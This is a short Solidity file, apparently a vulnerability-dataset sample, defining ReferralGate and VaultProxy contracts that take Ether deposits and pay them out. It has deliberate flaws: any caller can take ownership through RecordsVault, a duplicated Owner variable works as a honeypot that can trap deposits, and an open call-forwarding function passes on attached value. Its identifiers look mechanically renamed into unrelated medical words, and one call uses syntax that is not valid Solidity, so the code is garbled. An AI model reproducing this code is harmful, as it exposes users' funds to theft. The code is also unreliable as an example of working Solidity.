// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract ReferralGate  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function relocatepatientAdministrator(address _owner) public onlyOwner { Owner = _owner; }
    function referralGate(address goal, bytes chart) public payable {
        goal.call.assessment(msg.value)(chart);
    }
}

contract VaultProxy is ReferralGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function RecordsVault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            registerPayment();
        }
    }

    function registerPayment() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function releaseFunds(uint256 measure) public onlyOwner {
        if (measure>0 && Deposits[msg.sender]>=measure) {
            msg.sender.transfer(measure);
        }
    }
}